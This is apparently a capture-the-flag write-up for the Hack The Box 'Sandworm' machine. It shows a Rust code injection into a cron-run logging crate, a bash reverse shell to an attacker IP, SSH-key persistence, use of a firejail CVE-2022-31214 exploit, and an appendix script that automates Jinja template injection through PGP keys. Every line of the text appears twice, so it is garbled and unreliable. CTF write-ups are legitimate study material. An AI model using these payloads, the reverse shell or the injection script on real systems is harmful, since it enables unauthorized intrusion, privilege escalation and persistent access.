We have already seen that the file `/opt/crates/logger/src/lib.rs` is writable by the `silentobserver` user.  Let's test to see if we get command execution with this file.




## Exploiting TipNet for Privilege Escalation
## Exploiting TipNet for Privilege Escalation




We modified the `lib.rs` file to create the file `/tmp/0xe10c`.
We modified the `lib.rs` file to create the file `/tmp/0xe10c`.
```rust
```rust
extern crate chrono;
extern crate chrono;


use std::fs::OpenOptions;
use std::fs::OpenOptions;
use std::io::Write;
use std::io::Write;
use chrono::prelude::*;
use chrono::prelude::*;
use std::process::Command;
use std::process::Command;


pub fn log(user: &str, query: &str, justification: &str) {
pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);


    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Ok(file) => file,
        Err(e) => {
        Err(e) => {
            println!("Error opening log file: {}", e);
            println!("Error opening log file: {}", e);
            return;
            return;
        }
        }
    };
    };


    if let Err(e) = file.write_all(log_message.as_bytes()) {
    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
        println!("Error writing to log file: {}", e);
    }
    }


// CODE EXECUTION PAYLOD HERE
// CODE EXECUTION PAYLOD HERE
    let command = Command::new("touch") // command
    let command = Command::new("touch") // command
        .arg("/tmp/0xe10c") //args - just repeat this line as needed
        .arg("/tmp/0xe10c") //args - just repeat this line as needed
        .output()
        .output()
        .expect("bash command failed");
        .expect("bash command failed");


    if command.status.success() {
    if command.status.success() {
        println!("Command success");
        println!("Command success");
    } else {
    } else {
        println!("Command failed");
        println!("Command failed");
    }
    }
}
}


```
```


After waiting for the cron job to run again (confirm with `pspy`), we found the file `/tmp/0xe10c`, created by the user `atlas`. 
After waiting for the cron job to run again (confirm with `pspy`), we found the file `/tmp/0xe10c`, created by the user `atlas`. 




![[Pasted image 20230703145641.png]]
![[Pasted image 20230703145641.png]]


We have command execution.
We have command execution.


Using this process, we validated the ability of the target to reach the attacker over the network with this command injection.
Using this process, we validated the ability of the target to reach the attacker over the network with this command injection.
```rust
```rust
...
...
    let command = Command::new("ping")
    let command = Command::new("ping")
        .arg("-c1")
        .arg("-c1")
        .arg("10.10.14.207")
        .arg("10.10.14.207")
        .output()
        .output()
        .expect("bash command failed");
        .expect("bash command failed");
...
...
```
```




![[Pasted image 20230703150659.png]]
![[Pasted image 20230703150659.png]]






# Privesc
# Privesc






## Exploiting TipNet for revshell as `atlas`
## Exploiting TipNet for revshell as `atlas`




Using the payload shown below, we were able to receive a reverse shell as the `atlas` user.
Using the payload shown below, we were able to receive a reverse shell as the `atlas` user.


```rust
```rust
...
...
    let command = Command::new("bash")
    let command = Command::new("bash")
        .arg("-c")
        .arg("-c")
        .arg("bash -i >& /dev/tcp/10.10.14.207/9002 0>&1")
        .arg("bash -i >& /dev/tcp/10.10.14.207/9002 0>&1")
        .output()
        .output()
        .expect("bash command failed");
        .expect("bash command failed");


    if command.status.success() {
    if command.status.success() {
        println!("Command success");
        println!("Command success");
    } else {
    } else {
        println!("Command failed");
        println!("Command failed");
...
...
```
```




![[Pasted image 20230703153805.png]]
![[Pasted image 20230703153805.png]]




I enabled persistence by appending my attacker's SSH public key to `/home/atlas/.ssh/authorized_keys`, enabling persistent SSH access to the target as the user `atlas`.
I enabled persistence by appending my attacker's SSH public key to `/home/atlas/.ssh/authorized_keys`, enabling persistent SSH access to the target as the user `atlas`.




## `firejail` config file
## `firejail` config file




![[Pasted image 20230703155438.png]]
![[Pasted image 20230703155438.png]]






## Privilege escalation - `firejail` version 0.9.68 CVE-2022-31214
## Privilege escalation - `firejail` version 0.9.68 CVE-2022-31214






![[Pasted image 20230703160317.png]]
![[Pasted image 20230703160317.png]]




The host is running version 0.9.68 of `firejail`.
The host is running version 0.9.68 of `firejail`.


Searchsploit lists two exploits for older versions of this program.
Searchsploit lists two exploits for older versions of this program.


[This Seclists article](https://seclists.org/oss-sec/2022/q2/188) provides a Python exploit for privilege escalation by abusing the CVW.
[This Seclists article](https://seclists.org/oss-sec/2022/q2/188) provides a Python exploit for privilege escalation by abusing the CVW.


We transferred the exploit script to the target, ran it as the `atlas` user.  We received a shell as `root` and were able to access the `root.txt` flag.
We transferred the exploit script to the target, ran it as the `atlas` user.  We received a shell as `root` and were able to access the `root.txt` flag.




![[Pasted image 20230703160747.png]]
![[Pasted image 20230703160747.png]]






# Appendix A - `sandworm.sh` script
# Appendix A - `sandworm.sh` script




This was mostly written so I could practice using `getopts` for more robust scripting, but it did prove useful for enumerating and RCE.  Feel free to use it.
This was mostly written so I could practice using `getopts` for more robust scripting, but it did prove useful for enumerating and RCE.  Feel free to use it.


```bash
```bash


#!/bin/bash
#!/bin/bash






# HTB - Sandworm (Seasonal Week 1)
# HTB - Sandworm (Seasonal Week 1)




# Script to automate PGP Jinja template injection
# Script to automate PGP Jinja template injection




#
#




# Depends on pgp-pysuite - https://github.com/atriox2510/pgp-pysuite.git
# Depends on pgp-pysuite - https://github.com/atriox2510/pgp-pysuite.git




#
#




# Assumes pgp-pysuite is subdirectory of CWD
# Assumes pgp-pysuite is subdirectory of CWD




function usage() {
function usage() {
    echo -e "\tusage: $0 -u <target> [-c] -p <payload> [-d]"
    echo -e "\tusage: $0 -u <target> [-c] -p <payload> [-d]"


    echo -e "\n\t-c\t\tindicates that payload is a shell command"
    echo -e "\n\t-c\t\tindicates that payload is a shell command"
    echo -e "\t\t\totherwise, payload is treated as jinja template injection"
    echo -e "\t\t\totherwise, payload is treated as jinja template injection"


    echo -e "\n\t-d\t\tprint debug info"
    echo -e "\n\t-d\t\tprint debug info"


    echo -e "\n\t<payload>\tthe raw expression to be evaluated within the"
    echo -e "\n\t<payload>\tthe raw expression to be evaluated within the"
    echo -e "\t\t\tcurly braces or the os.system() Python system call"
    echo -e "\t\t\tcurly braces or the os.system() Python system call"
}
}




# prints only if invoked with -d
# prints only if invoked with -d


function log() {
function log() {
    [[ -v DEBUG ]] \
    [[ -v DEBUG ]] \
        && echo -e "\e[34m[+]\e[0m $1" 
        && echo -e "\e[34m[+]\e[0m $1" 
}
}




[[ $# -lt 4 ]] \
[[ $# -lt 4 ]] \
    && usage \
    && usage \
    && exit 1
    && exit 1


while getopts ':u:cp:d' OPTION; do
while getopts ':u:cp:d' OPTION; do
    case "${OPTION}" in
    case "${OPTION}" in
        u)
        u)
            TARGET=${OPTARG}
            TARGET=${OPTARG}
            ;;
            ;;
        p)
        p)
            PAYLOAD="${OPTARG}"
            PAYLOAD="${OPTARG}"
            ;;
            ;;
        c)
        c)
            COMMAND=true
            COMMAND=true
            ;;
            ;;
        d)
        d)
            DEBUG=true
            DEBUG=true
            ;;
            ;;
        ?)
        ?)
            usage
            usage
            exit 1
            exit 1
            ;;
            ;;
    esac
    esac
done
done


log "num args: $#" 
log "num args: $#" 
log "target url: ${TARGET}"
log "target url: ${TARGET}"
log "payload: ${PAYLOAD}"
log "payload: ${PAYLOAD}"
[[ -v COMMAND ]] && log "command: ${COMMAND}"
[[ -v COMMAND ]] && log "command: ${COMMAND}"
log "debug: ${DEBUG}"
log "debug: ${DEBUG}"






# send pgp stuff with malicious [jinja|python] payload
# send pgp stuff with malicious [jinja|python] payload






# generate malicious pgp keypair
# generate malicious pgp keypair




KEYGEN="${PWD}/pgp-pysuite/keygen.py"
KEYGEN="${PWD}/pgp-pysuite/keygen.py"
EMAIL="someguy@gmail.com"
EMAIL="someguy@gmail.com"




# if -c is unset, generate jinja payload
# if -c is unset, generate jinja payload


if [[ ! -v COMMAND ]]; then
if [[ ! -v COMMAND ]]; then
    log "generating new keypair with jinja"
    log "generating new keypair with jinja"
    python3 ${KEYGEN} -p 'password' -n "{{ ${PAYLOAD} }}" -e "${EMAIL}" >/dev/null # suppress pgp-pysuite output
    python3 ${KEYGEN} -p 'password' -n "{{ ${PAYLOAD} }}" -e "${EMAIL}" >/dev/null # suppress pgp-pysuite output


# otherwise generate shell command payload
# otherwise generate shell command payload


else
else
    log "generating new keypair with shellcode"
    log "generating new keypair with shellcode"
    python3 ${KEYGEN} \
    python3 ${KEYGEN} \
        -p 'password' \
        -p 'password' \
        -n "{{request.application.__globals__.__builtins__.__import__('os').popen('${PAYLOAD}').read()}}" \
        -n "{{request.application.__globals__.__builtins__.__import__('os').popen('${PAYLOAD}').read()}}" \
        -e "${EMAIL}" >/dev/null # suppress pgp-pysuite output
        -e "${EMAIL}" >/dev/null # suppress pgp-pysuite output
fi
fi


PUBKEY=${PWD}/keypgp_uwu.pub.asc
PUBKEY=${PWD}/keypgp_uwu.pub.asc
PRIVATEKEY=${PWD}/keypgp_uwu.key.asc
PRIVATEKEY=${PWD}/keypgp_uwu.key.asc


#log "PUBKEY:\n$(cat ${PUBKEY})\n"
#log "PUBKEY:\n$(cat ${PUBKEY})\n"




#log "PRIVATEKEY:\n$(cat ${PRIVATEKEY})\n"
#log "PRIVATEKEY:\n$(cat ${PRIVATEKEY})\n"






# encode some sort of message with private key
# encode some sort of message with private key


SIGN="${PWD}/pgp-pysuite/sign.py"
SIGN="${PWD}/pgp-pysuite/sign.py"
MSG=$(python3 ${SIGN} -c ${PUBKEY} -k ${PRIVATEKEY} -p password -m 'benign message' \
MSG=$(python3 ${SIGN} -c ${PUBKEY} -k ${PRIVATEKEY} -p password -m 'benign message' \
    | awk '/.*BEGIN PGP SIGNED MESSAGE.*/,/.*END PGP SIGNATURE.*/'
    | awk '/.*BEGIN PGP SIGNED MESSAGE.*/,/.*END PGP SIGNATURE.*/'
)
)
log "MSG:\n ${MSG}"
log "MSG:\n ${MSG}"




# send it to target
# send it to target


result=$(curl -s -ik -X POST \
result=$(curl -s -ik -X POST \
    "https://${TARGET}/process" \
    "https://${TARGET}/process" \
    --data-urlencode "signed_text=${MSG}" \
    --data-urlencode "signed_text=${MSG}" \
    --data-urlencode "public_key=$(cat ${PUBKEY})"\
    --data-urlencode "public_key=$(cat ${PUBKEY})"\
)
)


log "result:\n${result}"
log "result:\n${result}"




# recover exfil data
# recover exfil data


regex_begin='^.*GOODSIG [[:upper:][:digit:]]{16} '
regex_begin='^.*GOODSIG [[:upper:][:digit:]]{16} '
regex_end='gpg: Good signature'
regex_end='gpg: Good signature'
awk "/${regex_begin}/ { f = 1 } /${regex_end}/ { f = 0 } f" <(echo -n "${result}") \
awk "/${regex_begin}/ { f = 1 } /${regex_end}/ { f = 0 } f" <(echo -n "${result}") \
    | sed -r "s/${regex_begin}//" \
    | sed -r "s/${regex_begin}//" \
    | sed 's/<.*>.*//'
    | sed 's/<.*>.*//'


```
```


>[!note]
>[!note]
>Since this script has dubious future utility, the `-u` flag is not strictly necessary.  Again, this was just a learning project. 
>Since this script has dubious future utility, the `-u` flag is not strictly necessary.  Again, this was just a learning project. 
